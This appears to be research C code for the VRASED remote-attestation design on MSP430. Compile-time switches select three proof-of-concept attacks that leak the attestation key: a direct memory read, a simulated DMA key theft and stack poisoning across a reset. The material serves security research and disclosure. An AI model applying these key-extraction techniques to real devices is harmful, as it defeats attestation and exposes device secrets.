#include <string.h>

/*********** TRUSTED VRASED WRAPPER CODE (inside SW-Att) ***********/

#define MAC_ADDR 0x0230
#define KEY_ADDR 0x6A00
#define ATTEST_DATA_ADDR 0xE000
#define ATTEST_SIZE 0x20

extern void
hmac(
  uint8_t *mac,
  uint8_t *key,
  uint32_t keylen,
  uint8_t *data,
  uint32_t datalen
);

__attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() {

    //Save application stack pointer.
    //Allocate key buffer.
    #if __ATTACK == 3
    // NOTE: we explicitly remove the (redundant) zero-initialization here, as
    // it may generate an early reset when writing out of the MAC region.
    // However, this is only needed when the compiler does not already optimize
    // away the redundant zero-intialization when noticing the explicit memcpy
    // initialization below (e.g., as validated with clang-msp430).
    uint8_t key[64];
    #else
    uint8_t key[64] = {0};
    #endif
    //Copy the key from KEY_ADDR to the key buffer.
    memcpy(key, (uint8_t*)KEY_ADDR, 64);
    hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) 64, (uint8_t*) MAC_ADDR, (uint32_t) 32);
    // Uses the result in the key buffer to compute HMAC.
    // Stores the result in HMAC ADDR.
    hmac((uint8_t*) (MAC_ADDR), (uint8_t*) key, (uint32_t) 32, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);

	//return;

    // setting the return addr:
    __asm__ volatile("mov    #0x0300,   r6" "\n\t");
    __asm__ volatile("mov    @(r6),     r6" "\n\t");

    // postamble
    __asm__ volatile("add     #70,    r1" "\n\t");
    __asm__ volatile( "br      #__mac_leave" "\n\t");
}

__attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMAC_SHA2_256_hmac_exit() {
    __asm__ volatile("br   r6" "\n\t");
}

/*********** UNTRUSTED VRASED WRAPPER CODE (outside SW-Att) ***********/

#include <stdio.h>
#include "hardware.h"

#define DMA_ATTACKER_STEAL_KEY          0x0070
#define DMA_ATTACKER_PERSISTENT_FLAG    0x0072
#define DMA_ATTACKER_MEASURE            0x0074
#define DMA_ATTACKER_ACTIVE             0x0076

#define KEY_SIZE                        64

// MAC region: [0x0230, 0x250[
// NOTE: leave 12 bytes for local variables of memcpy function
#define STACK_POISON_ADDRESS            (MAC_ADDR + KEY_SIZE + 12)

// stringify macro parameter a
#define __s__(a)                        #a
#define _s_(a)                          __s__(a)

void my_memset(uint8_t* ptr, int len, uint8_t val) {
  int i=0;
  for(i=0; i<len; i++) ptr[i] = val;
}

void my_memcpy(uint8_t* dst, uint8_t* src, int size) {
  int i=0;
  for(i=0; i<size; i++) dst[i] = src[i];
}

void leak_key(uint8_t *buf, int start, int end)
{
    printf("leak[%d:%d]: ", start, end-1);

    for (int i = start; i < end; i++)
        printf("%02x", *(buf+i));
    printf("\n");
}

void VRASED (uint8_t *challenge, uint8_t *response) {
    printf("Attack: %d\n", __ATTACK);

    #if __ATTACK == 1
      leak_key((uint8_t*) KEY_ADDR, 31, 64);
      return;
    #endif

    #if __ATTACK == 2
      __asm__ volatile(
          "mov #1, &" _s_(DMA_ATTACKER_STEAL_KEY) "\n"
          ".REPT 64 \n"
          "nop \n"
          ".ENDR \n"
          "nop \n"
          "nop \n"
          "nop \n"
          "nop \n"
          "nop \n"
          "nop \n"
          "nop \n"
      );
      leak_key((uint8_t*) MAC_ADDR, 0, 64);
      return;
    #endif

    #if __ATTACK == 3
      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
        leak_key((uint8_t*) (STACK_POISON_ADDRESS - 64), 0, 22);
        return;
      } else {
        printf("First run\n");
      }
    #endif

    //Copy input challenge to MAC_ADDR:
    my_memcpy ( (uint8_t*)MAC_ADDR, challenge, 32);

    //Disable interrupts:
    __dint();

    // Save current value of r5 and r6:
    __asm__ volatile("push    r5" "\n\t");
    __asm__ volatile("push    r6" "\n\t");

    // Write return address of Hacl_HMAC_SHA2_256_hmac_entry
    // to RAM:
    __asm__ volatile("mov    #0x000e,   r6" "\n\t");
    __asm__ volatile("mov    #0x0300,   r5" "\n\t");
    __asm__ volatile("mov    r0,        @(r5)" "\n\t");
    __asm__ volatile("add    r6,        @(r5)" "\n\t");

    // Save the original value of the Stack Pointer (R1):
    __asm__ volatile("mov    r1,    r5" "\n\t");

    // Set the stack pointer to the base of the exclusive stack:
    // NOTE: call will do a 2-byte push, hence desired address+2
    #if __ATTACK == 3
      __asm__ volatile("mov #" _s_(STACK_POISON_ADDRESS + 2) ",     r1" "\n\t");
    #else
      __asm__ volatile("mov    #0x1002,     r1" "\n\t");
    #endif

    // Call SW-Att:
    Hacl_HMAC_SHA2_256_hmac_entry();

    // Copy retrieve the original stack pointer value:
    __asm__ volatile("mov    r5,    r1" "\n\t");

    // Restore original r5,r6 values:
    __asm__ volatile("pop   r6" "\n\t");
    __asm__ volatile("pop   r5" "\n\t");

    // Enable interrupts:
    __eint();

    // Return the HMAC value to the application:
    my_memcpy(response, (uint8_t*)MAC_ADDR, 32);
}
